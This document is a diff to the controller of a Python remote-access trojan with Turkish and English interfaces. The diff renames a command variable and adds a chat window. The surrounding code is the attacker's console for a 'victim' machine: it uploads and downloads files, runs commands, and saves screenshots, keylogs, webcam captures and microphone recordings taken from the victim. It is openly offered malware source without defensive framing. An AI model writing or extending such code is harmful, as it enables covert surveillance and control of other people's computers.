@@ -1,4 +1,5 @@
 import socket
+import subprocess
 import colorama
 from colorama import Fore,Back
 import os
@@ -16,6 +17,8 @@ colorama.init(autoreset=True)
 
 class TR_Dinleyici():
     def __init__(self,ip,port):
+        self.ip = ip
+        self.port = port
         self.Banner_goster()
         dinleyici = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         dinleyici.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
@@ -141,13 +144,13 @@ class TR_Dinleyici():
     def Dosya_Kaydet(self,yol,icerik):
         with open(yol,"wb") as dosya:
             dosya.write(base64.b64decode(icerik))
-            if komut_girisi[0] == "ekran_goruntusu":
+            if command_input[0] == "ekran_goruntusu":
                 return Fore.MAGENTA+"[+]Ekran goruntusu şuan durduğunuz dizine kaydedildi."
-            elif komut_girisi[0] == "kg_kaydet":
+            elif command_input[0] == "kg_kaydet":
                 return Fore.MAGENTA+"[+]Keylogger dosyasi şuan durduğunuz dizine kaydedildi."
-            elif komut_girisi[0] == "kamera_goruntusu_al":
+            elif command_input[0] == "kamera_goruntusu_al":
                 return Fore.MAGENTA+"[+]Kurbanin kamera goruntusu şuan durduğunuz dizine kaydedildi."
-            elif komut_girisi[0] == "ses_kayit_indir":
+            elif command_input[0] == "ses_kayit_indir":
                 return Fore.MAGENTA+"[+]Kurbanın ses kaydı şuan durduğunuz dizine kaydedildi."
             else:
                 return Fore.MAGENTA+"[+]Dosya şuan durduğunuz dizine indirildi."
@@ -163,33 +166,37 @@ class TR_Dinleyici():
     def Yardim(self):
         with open("menus/menuTR.txt","r",encoding="utf-8") as menu:
             return Fore.GREEN+menu.read()
+    def Sohbet(self):
+        subprocess.Popen(["xterm", "-T", "Chat", "-hold", "-e", "python", "util/chat_listener.py"])
 
     def Dinleyici_Basla(self):
         while True:
-            global komut_girisi
+            global command_input
             print(Fore.RED+"<<<<<Konsol@kurban>>>>>")
-            komut_girisi = input(Fore.BLUE + "        ╰──------>Komut:")
-            komut_girisi = komut_girisi.split(" ")
+            command_input = input(Fore.BLUE + "        ╰──------>Komut:")
+            command_input = command_input.split(" ")
 
             try:
-                if komut_girisi[0] == "yukle":
-                    dosya_icerigi = self.Dosya_Icerigi_Al(komut_girisi[1])
-                    komut_girisi.append(dosya_icerigi)
-                komut_cikisi = self.Komut_Calistir(komut_girisi)
+                if command_input[0] == "yukle":
+                    dosya_icerigi = self.Dosya_Icerigi_Al(command_input[1])
+                    command_input.append(dosya_icerigi)
+                elif command_input[0] == "sohbet":
+                    komut_cikisi = self.Sohbet()
+                komut_cikisi = self.Komut_Calistir(command_input)
 
-                if komut_girisi[0] == "indir" and "Komut uygulanamadi.Kurban makinenin baglantisi kesilmis olabilir." not in komut_girisi:
-                    komut_cikisi = self.Dosya_Kaydet(komut_girisi[1], komut_cikisi)
-                elif komut_girisi[0] == "temizle":
+                if command_input[0] == "indir" and "Komut uygulanamadi.Kurban makinenin baglantisi kesilmis olabilir." not in command_input:
+                    komut_cikisi = self.Dosya_Kaydet(command_input[1], komut_cikisi)
+                elif command_input[0] == "temizle":
                     komut_cikisi = self.Temizle()
-                elif komut_girisi[0] == "yardim":
+                elif command_input[0] == "yardim":
                     komut_cikisi = self.Yardim()
-                elif komut_girisi[0] == "ekran_goruntusu":
+                elif command_input[0] == "ekran_goruntusu":
                     komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurban_ekran_goruntusu.png",komut_cikisi)
-                elif komut_girisi[0] == "kg_kaydet":
+                elif command_input[0] == "kg_kaydet":
                     komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurbanin_keylogu.txt",komut_cikisi)
-                elif komut_girisi[0] == "kamera_goruntusu_al":
+                elif command_input[0] == "kamera_goruntusu_al":
                     komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurban_kamera_goruntusu.png",komut_cikisi)
-                elif komut_girisi[0] == "ses_kayit_indir":
+                elif command_input[0] == "ses_kayit_indir":
                     komut_cikisi = self.Dosya_Kaydet(self.Dosya_Tarih_Al()+"kurban_mikrofon_kaydi.wav",komut_cikisi)
             except Exception:
                 print(Back.BLACK+Fore.YELLOW+"Komut uygulanamadi.Kurban makinenin baglantisi kesilmis olabilir.")
@@ -200,6 +207,8 @@ class TR_Dinleyici():
 
 class EN_Listener():
     def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
         self.Show_Banner()
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -326,13 +335,13 @@ class EN_Listener():
     def Save_File(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
-            if komut_girisi[0] == "get_ss":
+            if command_input[0] == "get_ss":
                 return Fore.MAGENTA + "[+]Screenshot saved current directory."
-            elif komut_girisi[0] == "save_kg":
+            elif command_input[0] == "save_kg":
                 return Fore.MAGENTA + "[+]Keylogger file saved current directory."
-            elif komut_girisi[0] == "get_camera_image":
+            elif command_input[0] == "get_camera_image":
                 return Fore.MAGENTA + "[+]Victim's camera image saved current directory."
-            elif komut_girisi[0] == "download_sound_recording":
+            elif command_input[0] == "download_sound_recording":
                 return Fore.MAGENTA + "[+]Victim's microphone recording saved current directory."
             else:
                 return Fore.MAGENTA + "[+]The file saved current directory."
@@ -352,32 +361,38 @@ class EN_Listener():
         with open("menus/menuEN.txt","r") as menu:
             return Fore.LIGHTGREEN_EX+menu.read()
 
+    def Chat(self):
+        subprocess.Popen(["xterm","-T","Chat","-hold","-e","python","util/chat_listener.py"])
     def Start_Listener(self):
         while True:
-            global komut_girisi
+            global command_input
             print(Fore.RED + "<<<<<Console@victim>>>>>")
-            komut_girisi = input(Fore.BLUE + "╰──------>Command:")
-            komut_girisi = komut_girisi.split(" ")
+            command_input = input(Fore.BLUE + "╰──------>Command:")
+            command_input = command_input.split(" ")
             try:
-                if komut_girisi[0] == "upload":
-                    file_content = self.Get_File_Contents(komut_girisi[1])
-                    komut_girisi.append(file_content)
-                command_output = self.Execute_Command(komut_girisi)
+                if command_input[0] == "upload":
+                    file_content = self.Get_File_Contents(command_input[1])
+                    command_input.append(file_content)
+                elif command_input[0] == "chat":
+                    command_output = self.Chat()
 
-                if komut_girisi[0] == "download" and "The command could not be applied.The victim may disconnected." not in komut_girisi:
-                    command_output = self.Save_File(komut_girisi[1], command_output)
-                elif komut_girisi[0] == "clear":
+                command_output = self.Execute_Command(command_input)
+
+                if command_input[0] == "download" and "The command could not be applied.The victim may disconnected." not in command_input:
+                    command_output = self.Save_File(command_input[1], command_output)
+                elif command_input[0] == "clear":
                     command_output = self.Clear()
-                elif komut_girisi[0] == "help":
+                elif command_input[0] == "help":
                     command_output = self.Help()
-                elif komut_girisi[0] == "get_ss":
+                elif command_input[0] == "get_ss":
                     command_output = self.Save_File(self.Get_File_Date() + "victim_ss.png", command_output)
-                elif komut_girisi[0] == "save_kg":
+                elif command_input[0] == "save_kg":
                     command_output = self.Save_File(self.Get_File_Date() + "victims_keylog.txt", command_output)
-                elif komut_girisi[0] == "get_camera_image":
+                elif command_input[0] == "get_camera_image":
                     command_output = self.Save_File(self.Get_File_Date() + "victims_camera_image.png",command_output)
-                elif komut_girisi[0] == "download_sound_recording":
+                elif command_input[0] == "download_sound_recording":
                     command_output = self.Save_File(self.Get_File_Date() + "victims_microphone_sound.wav", command_output)
+
             except Exception:
                 print(Back.BLACK + Fore.YELLOW + "The command could not be applied.The victim may disconnected.")
             print(command_output)
